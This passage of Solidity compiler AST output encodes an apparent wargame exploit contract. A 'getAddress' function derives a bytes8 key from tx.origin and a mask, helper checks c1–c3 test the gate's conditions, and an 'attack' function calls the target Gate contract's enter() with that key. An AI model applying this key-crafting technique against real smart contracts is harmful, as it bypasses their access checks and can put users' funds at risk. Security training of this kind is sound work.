																	"typeString": "address"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															],
															"id": 22,
															"name": "Gate",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 9,
															"src": "278:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_contract$_Gate_$9_$",
																"typeString": "type(contract Gate)"
															}
														},
														"id": 24,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "278:10:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_Gate_$9",
															"typeString": "contract Gate"
														}
													},
													"src": "271:17:0",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_Gate_$9",
														"typeString": "contract Gate"
													}
												},
												"id": 26,
												"nodeType": "ExpressionStatement",
												"src": "271:17:0"
											}
										]
									},
									"documentation": null,
									"id": 28,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 19,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 18,
												"mutability": "mutable",
												"name": "addr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 28,
												"src": "239:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 17,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "239:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "238:14:0"
									},
									"returnParameters": {
										"id": 20,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "260:0:0"
									},
									"scope": 114,
									"src": "227:69:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 44,
										"nodeType": "Block",
										"src": "333:68:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 42,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 31,
														"name": "changedValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 16,
														"src": "344:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes8",
															"typeString": "bytes8"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint64",
																	"typeString": "uint64"
																},
																"id": 40,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"expression": {
																				"argumentTypes": null,
																				"id": 36,
																				"name": "tx",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": -26,
																				"src": "373:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_magic_transaction",
																					"typeString": "tx"
																				}
																			},
																			"id": 37,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"memberName": "origin",
																			"nodeType": "MemberAccess",
																			"referencedDeclaration": null,
																			"src": "373:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address_payable",
																				"typeString": "address payable"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address_payable",
																				"typeString": "address payable"
																			}
																		],
																		"id": 35,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "366:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint64_$",
																			"typeString": "type(uint64)"
																		},
																		"typeName": {
																			"id": 34,
																			"name": "uint64",
																			"nodeType": "ElementaryTypeName",
																			"src": "366:6:0",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 38,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "366:17:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint64",
																		"typeString": "uint64"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "&",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 39,
																	"name": "offset",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 14,
																	"src": "386:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint64",
																		"typeString": "uint64"
																	}
																},
																"src": "366:26:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint64",
																	"typeString": "uint64"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint64",
																	"typeString": "uint64"
																}
															],
															"id": 33,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "359:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_bytes8_$",
																"typeString": "type(bytes8)"
															},
															"typeName": {
																"id": 32,
																"name": "bytes8",
																"nodeType": "ElementaryTypeName",
																"src": "359:6:0",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 41,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "359:34:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_bytes8",
															"typeString": "bytes8"
														}
													},
													"src": "344:49:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes8",
														"typeString": "bytes8"
													}
												},
												"id": 43,
												"nodeType": "ExpressionStatement",
												"src": "344:49:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "38cc4831",
									"id": 45,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getAddress",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 29,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "323:2:0"
									},
									"returnParameters": {
										"id": 30,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "333:0:0"
									},
									"scope": 114,
									"src": "304:97:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 63,
										"nodeType": "Block",
										"src": "449:76:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint64",
														"typeString": "uint64"
													},
													"id": 61,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 54,
																		"name": "changedValue",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 16,
																		"src": "481:12:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes8",
																			"typeString": "bytes8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bytes8",
																			"typeString": "bytes8"
																		}
																	],
																	"id": 53,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "474:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint64_$",
																		"typeString": "type(uint64)"
																	},
																	"typeName": {
																		"id": 52,
																		"name": "uint64",
																		"nodeType": "ElementaryTypeName",
																		"src": "474:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 55,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "474:20:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint64",
																	"typeString": "uint64"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint64",
																	"typeString": "uint64"
																}
															],
															"id": 51,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "467:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_uint32_$",
																"typeString": "type(uint32)"
															},
															"typeName": {
																"id": 50,
																"name": "uint32",
																"nodeType": "ElementaryTypeName",
																"src": "467:6:0",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 56,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "467:28:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 59,
																"name": "changedValue",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 16,
																"src": "504:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes8",
																	"typeString": "bytes8"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_bytes8",
																	"typeString": "bytes8"
																}
															],
															"id": 58,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "497:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_uint64_$",
																"typeString": "type(uint64)"
															},
															"typeName": {
																"id": 57,
																"name": "uint64",
																"nodeType": "ElementaryTypeName",
																"src": "497:6:0",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 60,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "497:20:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_uint64",
															"typeString": "uint64"
														}
													},
													"src": "467:50:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"functionReturnParameters": 49,
												"id": 62,
												"nodeType": "Return",
												"src": "460:57:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "5f57697c",
									"id": 64,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "c1",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 46,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "420:2:0"
									},
									"returnParameters": {
										"id": 49,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 48,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 64,
												"src": "444:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 47,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "444:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "443:6:0"
									},
									"scope": 114,
									"src": "409:116:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 82,
										"nodeType": "Block",
										"src": "573:76:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint64",
														"typeString": "uint64"
													},
													"id": 80,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 73,
																		"name": "changedValue",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 16,
																		"src": "605:12:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes8",
																			"typeString": "bytes8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bytes8",
																			"typeString": "bytes8"
																		}
																	],
																	"id": 72,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "598:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint64_$",
																		"typeString": "type(uint64)"
																	},
																	"typeName": {
																		"id": 71,
																		"name": "uint64",
																		"nodeType": "ElementaryTypeName",
																		"src": "598:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 74,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "598:20:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint64",
																	"typeString": "uint64"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint64",
																	"typeString": "uint64"
																}
															],
															"id": 70,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "591:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_uint32_$",
																"typeString": "type(uint32)"
															},
															"typeName": {
																"id": 69,
																"name": "uint32",
																"nodeType": "ElementaryTypeName",
																"src": "591:6:0",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 75,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "591:28:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 78,
																"name": "changedValue",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 16,
																"src": "628:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes8",
																	"typeString": "bytes8"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_bytes8",
																	"typeString": "bytes8"
																}
															],
															"id": 77,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "621:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_uint64_$",
																"typeString": "type(uint64)"
															},
															"typeName": {
																"id": 76,
																"name": "uint64",
																"nodeType": "ElementaryTypeName",
																"src": "621:6:0",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 79,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "621:20:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_uint64",
															"typeString": "uint64"
														}
													},
													"src": "591:50:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"functionReturnParameters": 68,
												"id": 81,
												"nodeType": "Return",
												"src": "584:57:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "48e257cb",
									"id": 83,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "c2",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 65,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "544:2:0"
									},
									"returnParameters": {
										"id": 68,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 67,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 83,
												"src": "568:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 66,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "568:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "567:6:0"
									},
									"scope": 114,
									"src": "533:116:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 102,
										"nodeType": "Block",
										"src": "698:75:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													},
													"id": 100,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 92,
																		"name": "changedValue",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 16,
																		"src": "730:12:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes8",
																			"typeString": "bytes8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bytes8",
																			"typeString": "bytes8"
																		}
																	],
																	"id": 91,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "723:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint64_$",
																		"typeString": "type(uint64)"
																	},
																	"typeName": {
																		"id": 90,
																		"name": "uint64",
																		"nodeType": "ElementaryTypeName",
																		"src": "723:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 93,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "723:20:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint64",
																	"typeString": "uint64"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint64",
																	"typeString": "uint64"
																}
															],
															"id": 89,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "716:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_uint32_$",
																"typeString": "type(uint32)"
															},
															"typeName": {
																"id": 88,
																"name": "uint32",
																"nodeType": "ElementaryTypeName",
																"src": "716:6:0",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 94,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "716:28:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 97,
																	"name": "tx",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -26,
																	"src": "755:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_transaction",
																		"typeString": "tx"
																	}
																},
																"id": 98,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "origin",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "755:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															],
															"id": 96,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "748:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_uint16_$",
																"typeString": "type(uint16)"
															},
															"typeName": {
																"id": 95,
																"name": "uint16",
																"nodeType": "ElementaryTypeName",
																"src": "748:6:0",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 99,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "748:17:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_uint16",
															"typeString": "uint16"
														}
													},
													"src": "716:49:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"functionReturnParameters": 87,
												"id": 101,
												"nodeType": "Return",
												"src": "709:56:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "f2c07be5",
									"id": 103,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "c3",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 84,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "668:2:0"
									},
									"returnParameters": {
										"id": 87,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 86,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 103,
												"src": "692:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 85,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "692:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "691:6:0"
									},
									"scope": 114,
									"src": "657:116:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 112,
										"nodeType": "Block",
										"src": "806:43:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 109,
															"name": "changedValue",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 16,
															"src": "828:12:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes8",
																"typeString": "bytes8"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes8",
																"typeString": "bytes8"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 106,
															"name": "impl",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 11,
															"src": "817:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_Gate_$9",
																"typeString": "contract Gate"
															}
														},
														"id": 108,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "enter",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 8,
														"src": "817:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_bytes8_$returns$_t_bool_$",
															"typeString": "function (bytes8) external returns (bool)"
														}
													},
													"id": 110,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "817:24:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 111,
												"nodeType": "ExpressionStatement",
												"src": "817:24:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "9e5faafc",
									"id": 113,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "attack",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 104,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "796:2:0"
									},
									"returnParameters": {
										"id": 105,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "806:0:0"
									},
									"scope": 114,
									"src": "781:68:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 115,
							"src": "111:741:0"
						}
					],
					"src": "0:852:0"
				},
				"id": 0
			}
		}
	}
}